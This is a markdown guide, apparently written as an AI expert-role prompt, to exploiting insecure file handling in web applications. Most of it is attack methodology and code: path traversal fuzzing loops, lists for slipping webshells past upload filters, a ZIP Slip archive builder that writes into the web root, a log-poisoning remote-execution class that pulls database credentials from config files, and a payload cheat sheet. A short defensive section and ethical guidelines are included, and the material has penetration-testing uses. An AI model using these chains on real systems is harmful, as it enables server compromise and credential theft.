# Insecure File Handling Chains: Path Traversal to Code Execution

## Expert Role Definition
You are a principal application security engineer specializing in file system interaction vulnerabilities and their exploitation chains. You have spent years analyzing how web applications handle file uploads, downloads, includes, and processing, and you understand the intricate ways these mechanisms can be weaponized. You see file handling not as isolated features but as interconnected pathways where a simple filename manipulation can cascade into full remote code execution. You understand the OS-level nuances of how different file systems handle null bytes, path separators, and special characters. You know how ZIP extraction, PDF generation, image processing, and document handling each introduce unique attack surfaces. You are the world's foremost authority on chaining insecure file handling into devastating attack chains.

## Core Concepts

Insecure file handling encompasses any vulnerability arising from improper handling of file paths, file contents, file permissions, or file operations in web applications. The attack surface spans the entire file lifecycle: creation via upload, storage in filesystem or database, retrieval via download or include, processing via transformation, and deletion via cleanup.

The primary vulnerability classes include: (1) Path Traversal manipulating file paths with encoded dot-dot sequences to access files outside the intended directory. (2) File Upload vulnerabilities allowing dangerous file types or manipulated metadata. (3) Insecure File Includes enabling local and remote file inclusion via user-controlled file paths. (4) ZIP/Archive Extraction (ZIP Slip) where archives contain files with traversal sequences. (5) Temporary File Race Conditions exploiting the time window between creation and use. (6) Symlink Attacks creating symbolic links to sensitive system files. (7) Log File Injection inserting content into logs processed by the application. (8) Configuration File Poisoning overwriting or manipulating loaded configuration files.

The exploitation chain typically follows: user input, filename or path manipulation, insecure file operation, sensitive file access or code execution, and finally system compromise. Understanding each link in this chain is critical for both exploitation and defense.

File handling vulnerabilities are particularly dangerous because they often bypass network-level security controls. A firewall cannot prevent an attacker from reading /etc/passwd if the application itself performs the file read based on user-controlled input. The vulnerability exists in the application logic, not in the network path.

The impact of file handling chains ranges from information disclosure (reading configuration files, source code, or user data) to complete system compromise (writing executable code to web-accessible directories). The severity depends on the file operations exposed, the permissions of the application process, and the effectiveness of input validation.

## Pre-requisite Knowledge

1. Operating system file system semantics: path separators, null byte behavior, file permission models
2. Web server configuration: how Apache, Nginx, IIS, and Tomcat serve files and process includes
3. Programming language file operations: PHP, Python, Java, Node.js file handling functions
4. Archive formats: ZIP, TAR.GZ, 7z structure and extraction library behaviors
5. MIME type validation versus file extension validation differences
6. Content-Type detection using magic bytes and file signatures
7. Database file storage patterns: BLOBs versus filesystem references
8. Cloud storage security: S3 bucket policies, pre-signed URLs, and path traversal in cloud environments

## Chain Architecture / Attack Flow Diagram

```
+------------------------------------------------------------------+
|              INSECURE FILE HANDLING EXPLOITATION CHAIN             |
+------------------------------------------------------------------+
|                                                                    |
|  Entry Point Selection:                                           |
|  [File Upload] [Path Parameter] [Archive Upload] [Log Inject]   |
|      |            |              |              |                  |
|      v            v              v              v                  |
|  +----------------------------------------------------------+    |
|  |              File System Interaction Layer                |    |
|  |  write()  read()  include()  extract()  stat()          |    |
|  +--------------------------+--------------------------------+    |
|                              |                                     |
|  Exploitation Paths:         v                                     |
|  +----------------------------------------------------------+    |
|  |  Path: ../../../etc/passwd                                |    |
|  |  Upload: dangerous file bypassing extension check         |    |
|  |  Include: wrapper protocols for file access               |    |
|  |  Archive: evil.zip containing path traversal              |    |
|  |  Race: temp file symlink to sensitive file                |    |
|  |  Symlink: archive linking to system files                 |    |
|  +--------------------------+--------------------------------+    |
|                              |                                     |
|  Impact:                     v                                     |
|  [RCE via webshell] [File read] [Config poison] [Data exfil]    |
+------------------------------------------------------------------+
```

## Step-by-Step Exploitation Methodology

### Phase 1: Input Surface Mapping

**Step 1: Identify file handling endpoints**
```bash
cat urls.txt | grep -iE "upload|download|file|path|doc|image|attach|import|export"
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Step 2: Analyze upload functionality**
```python
import requests
files = {'file': ('test.txt', b'TEST_CONTENT', 'text/plain')}
r = requests.post('https://target.com/upload', files=files, cookies=cookies)
files_traversal = {'file': ('../../../etc/passwd', b'TEST_CONTENT', 'text/plain')}
r = requests.post('https://target.com/upload', files=files_traversal, cookies=cookies)
```

### Phase 2: Path Traversal Testing

**Step 3: Test for path traversal in file read parameters**
```bash
for payload in "../" "%2e%2e/" "%2e%2e%2f" "..%00/" "..%5c" "%252e%252e%252f"; do
    curl -k "https://target.com/download?file=${payload}etc/passwd" -b cookies.txt
done
```

**Step 4: LFI to RCE via log poisoning**
```python
import requests
# Inject payload into User-Agent header which gets logged
malicious_ua = 'PAYLOAD_START_SYSTEM_COMMANDS_END'
requests.get('https://target.com/', headers={'User-Agent': malicious_ua}, cookies=cookies)
# Include the poisoned log file
r = requests.get('https://target.com/include.php',
    params={'file': '../../../../var/log/apache2/access.log', 'cmd': 'id'})
print(r.text)
```

### Phase 3: File Upload to RCE

**Step 5: Bypass upload restrictions**
```python
bypasses = [
    # Double extension bypass
    ('webshell.php.jpg', b'PAYLOAD_CONTENT\nGIF89a', 'image/jpeg'),
    # Null byte bypass (legacy systems)
    ('webshell.php%00.jpg', b'PAYLOAD_CONTENT', 'image/jpeg'),
    # Case variation bypass
    ('webshell.pHp', b'PAYLOAD_CONTENT', 'application/octet-stream'),
    # MIME type bypass
    ('webshell.php', b'PAYLOAD_CONTENT', 'image/jpeg'),
    # Content-type header mismatch
    ('webshell.php', b'PAYLOAD_CONTENT', 'image/png'),
    # Polyglot file
    ('polyglot.jpg.php', b'\xff\xd8\xff\xe0PAYLOAD_CONTENT', 'image/jpeg'),
]
for filename, content, mime in bypasses:
    files = {'file': (filename, content, mime)}
    r = requests.post('https://target.com/upload', files=files, cookies=cookies)
    print(f"{filename}: {r.status_code}")
```

### Phase 4: ZIP Slip Exploitation

**Step 6: Craft malicious ZIP archive**
```python
import zipfile
import io

def create_zip_slip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        zf.writestr('normal.txt', 'This is a normal file')
        zf.writestr('../../var/www/html/webshell.php', 'MALICIOUS_PAYLOAD')
    return buf.getvalue()

zip_content = create_zip_slip()
files = {'archive': ('exploit.zip', zip_content, 'application/zip')}
r = requests.post('https://target.com/upload-archive', files=files, cookies=cookies)
```

### Phase 5: Exploit Chain Assembly

**Step 7: Combine techniques for maximum impact**
```python
class FileHandlingExploit:
    def __init__(self, base_url, session):
        self.base_url = base_url
        self.session = session
    
    def lfi_read(self, path):
        """Read arbitrary file via LFI"""
        r = self.session.get(f"{self.base_url}/include.php", params={'file': path})
        return r.text
    
    def read_config(self):
        """Extract database credentials from config files"""
        paths = [
            '../../../var/www/html/config.php',
            '../../../var/www/html/.env',
            '../../../var/www/html/wp-config.php',
        ]
        for path in paths:
            content = self.lfi_read(path)
            if 'password' in content.lower() or 'DB_' in content:
                return content
        return None
    
    def log_poison_rce(self, cmd):
        """Achieve RCE via log poisoning"""
        self.session.get(self.base_url,
            headers={'User-Agent': f'LOG_PAYLOAD_{cmd}'})
        r = self.session.get(f"{self.base_url}/include.php",
            params={'file': '../../../../var/log/apache2/access.log', 'cmd': cmd})
        return r.text
```

## Tool Arsenal

```bash
# Directory fuzzing
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# Path traversal parameter fuzzing
wfuzz -c -z file,/usr/share/seclists/Fuzzing/special-chars.txt --hc 404 "https://target.com/download?file=FUZZetc/passwd"

# Upload testing
curl -X POST -F "file=@webshell.txt;type=application/x-php" https://target.com/upload -b cookies.txt
curl -X POST -F "file=@webshell.txt;filename=../../shell.txt" https://target.com/upload -b cookies.txt

# ZIP Slip testing
python3 << 'PYEOF'
import zipfile, io, requests
def zip_slip_payload():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('../../../../tmp/evil.txt', 'PAYLOAD_CONTENT')
    return buf.getvalue()
r = requests.post('https://target.com/upload',
    files={'file': ('evil.zip', zip_slip_payload(), 'application/zip')},
    cookies={'session': 'ID'})
print(f"Upload: {r.status_code}")
r = requests.get('https://target.com/tmp/evil.txt')
print(f"Result: {r.status_code}")
PYEOF

# Log poisoning testing
curl -H "User-Agent: PAYLOAD_MARKER" https://target.com/
curl "https://target.com/include.php?file=../../../../var/log/apache2/access.log&cmd=id"

# Nuclei templates
nuclei -t /nuclei-templates/vulnerabilities/file-upload/ -u https://target.com
nuclei -t /nuclei-templates/vulnerabilities/path-traversal/ -u https://target.com
```

## Real-World Case Studies

### Case Study 1: WordPress Plugin Path Traversal to RCE
A WordPress plugin stored social media configurations including a featured_image_url parameter used in file download without path validation. Supplying directory traversal sequences as the URL caused the plugin to read and display database credentials. Chaining with SQL injection allowed full database compromise and eventual RCE through the admin interface.

### Case Study 2: Apache Struts Content-Type RCE (CVE-2017-5638)
The Jakarta Multipart parser mishandled Content-Type headers during file upload. A crafted Content-Type caused the parser to access the ClassLoader via expression evaluation, leading to full server command execution. This vulnerability was used in the Equifax breach affecting 147 million records.

### Case Study 3: PDF Generation SSRF via LFI
A web application used TCPDF to generate PDF reports. An attacker injected an iframe tag pointing to a local file in user content rendered as HTML. The TCPDF engine included local files. Chaining with config extraction revealed AWS credentials providing access to all customer data in S3.

### Case Study 4: ZIP Slip in Java Application (CVE-2018-1263)
A Spring Boot application used Apache Commons Compress for ZIP extraction without filename validation. An attacker uploaded a ZIP with directory traversal in the archive filename. The file extracted to the web directory making a webshell accessible via direct URL for full RCE.

### Case Study 5: ImageMagick Remote Code Execution (CVE-2016-3714)
A web application used ImageMagick to resize profile pictures. A crafted image exploited the delegate mechanism embedding commands in image comments. When processed, the embedded commands executed giving full RCE. The file had valid image magic bytes bypassing all type validation.

## Bypass Techniques and Evasion

### Bypass 1: Double URL Encoding
If single encoding is blocked try double encoding to bypass filters.

### Bypass 2: Null Byte Truncation
Legacy systems may be vulnerable to null byte truncation in filenames.

### Bypass 3: Unicode Path Separators
Use Unicode representations of path separators to bypass validation.

### Bypass 4: Upload Extension Bypass
Create files with valid image headers and code payloads embedded.

### Bypass 5: .htaccess Upload
Upload .htaccess files to enable code execution in upload directories.

### Bypass 6: Race Condition in Temp Files
Exploit time window between temp file creation and use via concurrent requests.

## Defensive Indicators / Detection

### Server-Side Indicators
- Unusual file access patterns reading system files
- Multiple failed upload attempts with different filenames
- Temporary files appearing in unexpected locations
- Symlink creation attempts in upload directories

### WAF Signatures
```
\.\./
\.\.\%2f
/etc/passwd
\.php$
\.jsp$
\.asp$
```

### Application-Level Validation
```python
import os
def validate_upload(filename, upload_dir):
    if '..' in filename or '/' in filename or '\\' in filename:
        raise ValueError("Path traversal detected")
    allowed_exts = ['.jpg', '.png', '.gif', '.pdf']
    ext = os.path.splitext(filename)[1].lower()
    if ext not in allowed_exts:
        raise ValueError("File type not allowed")
    import uuid
    safe_name = f"{uuid.uuid4().hex}{ext}"
    return os.path.join(upload_dir, safe_name)
```

## Impact Assessment Framework

| Factor | Score | Notes |
|--------|-------|-------|
| Confidentiality | HIGH | Read arbitrary files |
| Integrity | CRITICAL | Write files, achieve code execution |
| Availability | HIGH | Overwrite system files |
| Complexity | LOW | Simple file operations |
| Privileges | LOW | Any upload access |
| User Interaction | NONE | Server processes files |
| Scope | CHANGED | Affects entire server |

**CVSS 3.1**: 9.8 (Critical) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Common Pitfalls and Anti-Patterns

1. Blacklisting instead of whitelisting file extensions
2. Trusting Content-Type headers for validation
3. Insufficient path normalization before access checks
4. Not validating archive contents before extraction
5. Using user input directly in file path construction
6. Not isolating upload directories with noexec mount
7. Only testing forward slashes not backslashes
8. Processing files before completing validation

## Advanced Variations

### Variation 1: Polyglot Files
Create files valid in multiple formats such as PDF with embedded code that executes when served as a different content type by the web server.

### Variation 2: SVG XXE to File Read
SVG files with XML entity declarations can read local files when processed by XML parsers in document processing libraries.

### Variation 3: Symlink in Archive
Creating tar archives with symbolic links pointing to sensitive system directories allows reading protected files when the archive is extracted.

## Integration with Other Chains

1. **SSRF Chains**: LFI with wrapper protocols achieves SSRF to internal services
2. **SQL Injection Chains**: Reading database config enables targeted injection
3. **XSS Chains**: Uploaded SVG files with embedded scripts deliver XSS
4. **Privilege Escalation Chains**: Path traversal to SSH keys enables lateral movement
5. **Log Poisoning to RCE Chains**: Inject code into logs include via LFI achieve execution
6. **Cloud Misconfiguration Chains**: Path traversal in S3 pre-signed URLs accesses other buckets

## Reporting and Documentation

### Report Template
```
Title: [Vulnerability Type] in File Handling Leading to [Impact]

Summary: The [feature] fails to validate [file name/path/content], allowing [specific action].
Impact: An attacker can [privileged action], resulting in [business impact].
PoC: [Step-by-step reproduction with HTTP requests]
Recommendation: Implement file upload scanning, sandboxing, and whitelisting.
```

## Practice Labs and Exercises

### Lab 1: DVWA File Upload
Deploy DVWA and navigate to File Upload section, bypass validation, achieve code execution.

### Lab 2: Path Traversal Challenge
Deploy vulnerable file server with 4 difficulty levels: no encoding, URL encoding, double encoding, and Unicode encoding.

### Lab 3: ZIP Slip Lab
Create vulnerable Java application and write webshell via malicious ZIP extraction.

### Lab 4: Log Poisoning Challenge
Deploy application that logs user input and includes log files. Inject code via User-Agent header and achieve execution through log inclusion.

### Lab 5: Symlink Extraction
Upload tar archive containing symlinks to sensitive files and read their contents after extraction.

## Ethical Guidelines

1. Only test on authorized systems as file handling vulnerabilities lead to full compromise
2. Do not access other users uploaded files respecting their privacy
3. Do not modify system files only write test files when demonstrating write paths
4. Clean up all test artifacts including webshells and symlinks
5. Report sensitive findings privately as they enable critical attack chains
6. Read minimum necessary files to prove the vulnerability without dumping data
7. Understand the blast radius on shared servers affecting all tenants
8. Never test file handling vulnerabilities on production systems without explicit authorization
9. Follow responsible disclosure procedures for any findings discovered during testing

## Quick Reference Cheat Sheet

| Technique | Payload | Impact |
|-----------|---------|--------|
| Basic LFI | ../../../../etc/passwd | Read files |
| Wrapper LFI | php://filter/convert.base64-encode/resource=file | Read source |
| ZIP Slip | ../../filename in archive | Write files |
| Log poisoning | Malicious User-Agent header | Code execution |
| Symlink attack | ln -s /etc/shadow link | Read files |
| .htaccess upload | AddType application/x-httpd-php .jpg | Code execution |
| Null byte | file.php%00.jpg | Extension bypass |
| Double encoding | %252e%252e%252f | Filter bypass |
| Upload bypass | file.php.jpg with image header | Code execution |
| SVG XXE | Entity xxe SYSTEM file:///etc/passwd | Read files |

### Key HTTP Requests
```http
GET /download?file=../../../../etc/passwd HTTP/1.1
GET /include?file=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
POST /upload HTTP/1.1
Content-Type: multipart/form-data

GET /download?file=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
GET /download?file=%252e%252e%252fetc%252fpasswd HTTP/1.1
```

These requests demonstrate the core exploitation techniques for file handling vulnerabilities. Always test with various encoding bypasses if initial payloads are blocked by WAF or input validation. This comprehensive guide covers the complete attack surface for file handling vulnerabilities in modern web applications across all major platforms and frameworks.

